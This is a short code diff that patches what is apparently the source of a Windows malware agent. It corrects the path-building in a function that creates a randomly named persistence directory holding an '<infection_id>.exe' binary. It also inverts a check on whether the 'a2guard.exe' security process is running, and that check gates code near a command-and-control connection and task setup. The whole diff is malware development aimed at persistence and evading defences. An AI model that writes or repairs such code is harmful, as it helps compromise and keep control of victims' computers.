@@ -1310,6 +1310,7 @@ void agent_create_persistance_directory(char *path, char *infection_id)
 	path[dirpathln] = '\\';
 	rand_get_string(&path[dirpathln + 1]);
 	CreateDirectoryA(path, nullptr);
+	path[strlen(path)] = '\\';
 	strcpy(&path[strlen(path)], infection_id);
 	strcpy(&path[strlen(path)], ".exe");
 }
@@ -1942,7 +1943,7 @@ int main()
 			agent_connect_to_c2();
 		}
 
-		if (windows_is_process_running("a2guard.exe"))
+		if (!windows_is_process_running("a2guard.exe"))
 		{
 			char binary_path[0x100] = {0};
 			char taskpath[0x100] = {0};
